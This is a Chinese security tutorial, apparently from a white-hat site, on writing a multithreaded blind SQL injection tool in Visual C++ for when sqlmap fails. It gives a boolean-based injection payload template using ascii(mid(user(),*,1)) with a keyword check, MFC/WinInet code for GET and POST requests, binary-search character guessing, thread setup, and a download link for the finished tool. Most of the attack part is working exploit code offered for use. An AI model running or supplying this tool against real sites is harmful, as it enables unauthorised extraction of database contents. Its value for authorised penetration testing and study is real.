# VC编写多线程sql盲注工具.doc

对于白帽子来说，最钟爱的`SQL`注入工具莫过于`sqlmap`。随着攻防对抗的升级，`sql`注入漏洞呈明显下降的趋势，同时也呈现出难发现、难利用的特点。在实际测试的时候发现，有时明明手工确认的注入，丢进`sqlmap`确无法识别出来。于是乎就有了各种`py`脚本来跑数据。通常找到一个注入在`sqlmap`识别不出或者无法跑出数据的情况下，到处找合适的脚本，然后再修改，如果对PY脚本熟悉，可能也来的快，但是假如对`PY`脚本不是很熟悉，每次必然花费大量精力和时间在此上面。因此在常用工具无法识别`SQL`注入或者无法跑出数据的时候，用`VC`做一个通用`GU`I框架，采用半自动、多线程并发的方式来进行`SQL`盲注，就显得既方便又节约时间。程序界面设计如图（只为功能，不求美观）：

![enter image description here](http://drops.javaweb.org/uploads/images/e22142b490126254594addcada731020418362ea.jpg)

如果常用的比较强大的注入工具能识别、能跑出数据当然就不需要该工具，也就当其他工具无法识别，我们也能构造出`payload`证明注入的存在时，这时候我们只需将构造好的`payload`填入工具的参数里，让工具帮我们自动出数据，这是工具的设计初衷。通常`sql`注入有两种请求数据方式一种是`get`,一种是`post`。存在注入的参数一般在请求的`url`中或者`post`的`data`数据中，我们将分两种情况来设计该注入工具。

0x00 GET方式注入
=====

对于此方式，注入参数在URL地址里，我们需要填好`URL`和页面差异字符串就可以了。比如我们在测试的时候，找到一个注入点，并且构造好了出数据的注入语句类似如下：

```
http://a.abc.com/abc"+if((ascii(mid(user(),1,1))>1),"d",1)+"ef/

```

这里通过改变`mid`第二个参数的值可以遍历猜解`user()`的每个字符，这样就有两个变量了，这是其中一个，这里命名为`A`，`A`的取值在于`USER`的长度比如1-20。另一个就是`>`后面的数字，命名为`B`，`B`的取值范围设为32-126,这个范围包含了所有可见字符的`ASC`码，通过改变该数字`B`我们就可以得到对应的每个正确的字符。通常情况下我们构造的注入语句如果为真即`ascii(mid(user(),1,1))>1`成立，那么返回正常页面，如果不成立返回其他页面。我们把正常页面里有而异常页面里没有的一个字符串作为`keyword`。比如访问`http://a.abc.com/abc"+if((ascii(mid(user(),1,1))>100),"d",1)+"ef/`后返回正常页面包含`keyword`，访问`http://a.abc.com/abc"+if((ascii(mid(user(),1,1))>101),"d",1)+"ef/`后返回异常页面没有`keyword`，这样我们就判断出`ascii(mid(user(),1,1))=101`。

那么我们设计程序的时候我们把`A``B`两个变量用`*`代替以告诉程序它们是需要改变的，把`keyword`也提交给程序，告诉它得到`keyword`的时候就表示访问的页面里的注入语句为真，否则为假。这样就可以让程序自动循环遍历所有的其他字符了。由于涉及循环里面界面显示的问题，所以猜解函数务必要放到线程里面，否则界面会卡死。

为了减少猜解时间，这里我们采用二分法查找数据（由于业余编程，代码只为实现功能，编码不好，请谅解），其关键代码如下：

```
left=32; //设置二分法查找初始值，范围就是可见字符的ASC码范围

right=126;
while((right-left)!=1) 

//二分法查找，当某次命中目标时，由于是（假如）
//用>判断，所以值域范围将左移到左边中间点，接
//着再慢慢向右移动，由于是二分取整操作，那么直//到left、 right差为1的时候 判断会结束，这时right
//就是最终值了。<号时 相反 最终取值left。

{
strcpy(url,ysurl);  //用指针来操作字符串，有点臃肿
p1=strstr(url,"*");
*p1='\0';
p1=strstr(ysurl,"*");
p1++;
char buf[3];
itoa(i,buf,10);   //猜解第i位
strcat(url,buf);
strcat(url,p1);  //这部分定位2个*的位置 并处理好URL，
p1=strstr(url,"*");
*p1='\0';
p1=strstr(ysurl,"*");
p1++;
p1=strstr(p1,"*");
p1++;
j=(left+right)/2;
itoa(j,buf,10);
strcat(url,buf);
strcat(url,p1);

wsprintf(bufx,"%c",j);
dresult+=bufx;
thelist->SetItemText(i-1,0,dresult);
//设置列表框显示
CInternetSession session("HttpClient");  
CHttpFile* pfile = (CHttpFile *)session.OpenURL(url);  //get方式 访问url
DWORD dwStatusCode;  
pfile -> QueryInfoStatusCode(dwStatusCode);  
if(dwStatusCode == HTTP_STATUS_OK)  
{  

CString data;  
while (pfile -> ReadString(data))  
{  
content  += data + "\r\n";  
}   
content.TrimRight();//获得请求url后页面返回内容
//printf(" %s\n " ,(LPCTSTR)content);  
}  
pfile -> Close();  
delete pfile;  
session.Close();
if (large==1)   //如果比较的时候用的是>的情况
{
if(content.Find(keyword)>0) //从返回内容查找是否有keyword
left=j;
else right=j;
}
Else //比较符为<时的情况
{
if(content.Find(keyword)>0)
right=j;
else left=j;
}
content.Empty();
dresult.Delete(dresult.GetLength()-1,1);

}
if(large==1)
{
rbuf[i-1]=(char)right;      //如果是> right作为循环结束后的结果
wsprintf(buf,"%c\r\n",right);

}
Else ////如果是< left作为循环结束后的结果
{
rbuf[i-1]=(char)left;               
wsprintf(buf,"%c\r\n",left);

}
dresult+=buf;
dresult+="  ok!";//第i位结果猜解完毕 

```

接下来我们把这段代码放在另外一个循环里`for(i=1,i<21,i++)`这样就可以循环遍历user每一位字符。多线程我们放到最后来讲。

0x01 POST方式注入
=====

和`get`方式不同的地方，这里`post`注入参数在`data`中，其实放在哪里都没关系，主要的是要将数据向对方`80`端口发送出去，最后我们要获取返回内容并根据`keyword`来判断条件的真假，最终确定我们想要得到的每个字符。与`GET`方式不同的是我们需要实现一个函数，来向服务器`post`请求数据，完整代码如下：

```
CString Postdata(char *url,char *data)  //传递两个参数 url 和data
{
LPTSTR AcceptTypes[2] = {TEXT("*/*"), NULL}; //接受文件的类型
CString strHeaders = _T("Content-Type: application/x-www-form-urlencoded\r\n");
charszReferer[100]  = "http://www.test.com";  
CString szFormData   = data;   //post的”参数“
HINTERNET   hSession;      
HINTERNET   hConnect;      
HINTERNET   hRequest;      
BOOL        bReturn  = FALSE;   
char *p1,*p2;
p1=strstr(url,"//"); //对url处理 获得服务器地址 以及访问目录
p1+=2;
p2=strstr(p1,"/");
char host[100];
memset(host,0,100);
strncpy(host,p1,p2-p1);
p2++;
char road[100];
memset(road,0,100);
strcpy(road,p2); // 建立HTTP请求
hSession = InternetOpen("AutoVoteVisPostMethod",
    INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);  
hConnect = InternetConnect(hSession,host,
INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,1);       hRequest = HttpOpenRequest(hConnect,"POST",road,
    "HTTP/1.1",szReferer,(LPCSTR *)&AcceptTypes,INTERNET_FLAG_RELOAD,1); // 提交数据
LPVOID pBuf = (LPVOID)szFormData.GetBuffer(szFormData.GetLength());   
bReturn = HttpSendRequest(hRequest,
    strHeaders,-1L,pBuf,szFormData.GetLength());   
char    szRecvBuf[1024];        // 接受数据缓冲区   
DWORD   dwNumberOfBytesRead;    // 服务器返回大小   
DWORD   dwRecvTotalSize=0;      // 接受数据总大小   
DWORD   dwRecvBuffSize=0;       // 接受数据buf的大小   
CFile   m_File;                 // 将返回数据写入文件   
CString strTemp,mystr;                // 临时消息框   
memset(szRecvBuf,0,1024);   
 do  
{      
    // 开始读取数据   
    bReturn = InternetReadFile(hRequest,szRecvBuf,1024,&dwNumberOfBytesRead);           
   szRecvBuf[dwNumberOfBytesRead] = '\0';   
    dwRecvTotalSize += dwNumberOfBytesRead;   
    dwRecvBuffSize  += strlen(szRecvBuf);   
    mystr+=szRecvBuf;
  } while(dwNumberOfBytesRead !=0);   
return mystr;
}

```

接下来就和`GET`方式注入大同小异了，主要就是根据返回的内容以及`keyword`来判断确定每个字符。关键代码如下：

```
i=SomeParam1->i;
//和GET方式不同，这里用CString类来对字符串操作 看起来要美观一点
mdata.Delete(index1,1);  //删除*
itoa(i,buf,10);
mdata.Insert(index1,buf); //插入i
if(i>9)
{
index2+=1;//前面*位置插入了2个字符 后面*的位置要加1了
}
//以后长度就固定了 不用
char buf2[30];
wsprintf(buf2,"猜解第%d位:",i);
dresult+=buf2;
thelist->InsertItem(i-1,dresult,0);
while((right-left)!=1)
{
CString rdata;
mdata.Delete(index2,1);
if(j>10)mdata.Delete(index2,1);   //之前插入2位字符那么就要多删一次
if(j>99)mdata.Delete(index2,1);   //三位就再多删一次
j=(left+right)/2;
itoa(j,buf,10);
mdata.Insert(index2,buf);   //插入j 参与比较的字符的ASC码
wsprintf(bufx,"%c",j);
dresult+=bufx;
thelist->SetItemText(i-1,0,dresult); //显示当前参与比较的字符
CString tdata;
tdata=mdata;
rdata=Postdata(url,tdata.GetBuffer(tdata.GetLength()));//发送post请求
if (large==1)  //这里和get方式类似
{
    if(rdata.Find(keyword.GetBuffer(keyword.GetLength()))>0)
        left=j;
    else right=j;
}
   dresult.Delete(dresult.GetLength()-1,1); //删除当前参与比较的字符，即
}  //在原位置显示下一个参与比较的字符
if(large==1)
{
rbuf[i-1]=(char)right;              
wsprintf(buf,"%c\r\n",right);
}
dresult+=buf; //得到结果
dresult+="  ok!";
thelist->SetItemText(i-1,0,dresult);

```

0x02 多线程并发注入
============

如果我们把每个字符的猜解都开一个线程，那么将大大提高猜解的时间。由于原本我们显示是用的文本控件，那么多线程的时候是没办法完全显示猜解的过程的。于是必须改用列表控件。这样每个线程i对应一个显示行，这样就可以完整显示猜解过程了。但是还有个问题，这个列表控件是不可编辑的，也就是最终的结果不能复制下来，这样是很不方便的。

经过左思右想，我们可以定义一个字符数组`char rbuf[20]`，`rbuf[]`数组初始化为20个空格，每开一个线程得到的结果就放到`rbuf[i]`里，每一个线程结束的时候都进行一次显示设置：

```
myresult=rbuf;
kjResult->SetWindowText(myresult);  //显示到文本控件里

```

这样当一个线程结束时会显示一次`rbuf`数组的字符，如果猜解出来的就显示出来，没猜解出来的显示的就是空格，当最后一个线程结束的时候，`rbuf`保存的是所有线程的猜解结果，就完全显示出来了。显示问题解决后，那么接着解决多线程问题：

首先将我们的`post`、`get`猜解函数定义成多线程函数格式：

```
static UINT __cdecl MyGetInject(LPVOID lpParam);
static UINT __cdecl MyPostInject(LPVOID lpParam);

```

由于是`static`的 那么我们初始化时自动生成的控件变量都是不可以写进上面的函数里的。所以必须首先定义个结构体，然后把这些变量通过结构体传递给线程函数，结构体如下：

```
struct Param
{
    int i;  //user长度，循环次数，也时线程数
    CString url;  //请求的url 这些是需要通过控件变量传递来的
    CString keyword;  
    CString data;
    CEdit *result;  //显示最后结果的控件变量
    CListCtrl *list; //显示猜解过程的控件变量
};

```

万事具备之后，我们就可以循环开启线程了：

```
Param SomeParam;
SomeParam.url=m_url;
SomeParam.keyword=m_key;
SomeParam.result=lresult;
SomeParam.data=m_data;
SomeParam.list=(CListCtrl *)GetDlgItem(IDC_LIST2);
int i=0;
for(i=0;i<21;i++)
{
SomeParam.i=i;
AfxBeginThread(MyPostInject,(LPVOID)&SomeParam);//循环开启猜解线程

Sleep(1); //要sleep一下 否则第一条显示有问题，还没来得及 后面的线程就会吞没它的

}

```

到此我们的盲注辅助工具就算完工了。程序猜解过程界面如图（GET 方式）： 所有线程都还没猜解出结果时：

![enter image description here](http://drops.javaweb.org/uploads/images/cb2646c4ec798413e74b2bf4da34194836c9a6f4.jpg)

部分线程猜解除结果时：

![enter image description here](http://drops.javaweb.org/uploads/images/935a560505825a6dbdd60ee1bff4194e55847b1d.jpg)

所有线程猜解完毕时：

![enter image description here](http://drops.javaweb.org/uploads/images/b93a05d8b00c72883a035a371cd9fed60b41026f.jpg)

0x03 总结
=====

1、使用的时候请务必提供注入所需要的参数，否则程序会崩溃。使用方法：`http://a.abc.com/abc"+if((ascii(mid(user(),1,1))>100),"d",1)+"ef/`如果猜解`user()`，那么就改成`http://a.abc.com/abc"+if((ascii(mid(user(),*,1))>*),"d",1)+"ef/`，注入参数里需要两个`*`。也可以将`user()`换成其他的，比如`@@version`等。

访问`http://a.abc.com/abcef/`选择一个非汉字的字符串作为`keyword`，同时访问`http://a.abc.com/abc"+if((ascii(mid(user(),1,1))>255),"d",1)+"ef/`检查下这个页面没有`keyword`，那么这个keyword才可用。

2、程序限定了开20个线程，猜解字段名的前20个字符。

3、本程序只是在其他强大的注入工具无法识别或者不能出数据的时候，以作检测证明之用。当然您也可以用py脚本，可以灵活修改。望此文起抛砖引玉之效！

4、下载地址：[http://yunpan.cn/cmYhLZP983U6J](http://yunpan.cn/cmYhLZP983U6J)（提取码：`3abe`）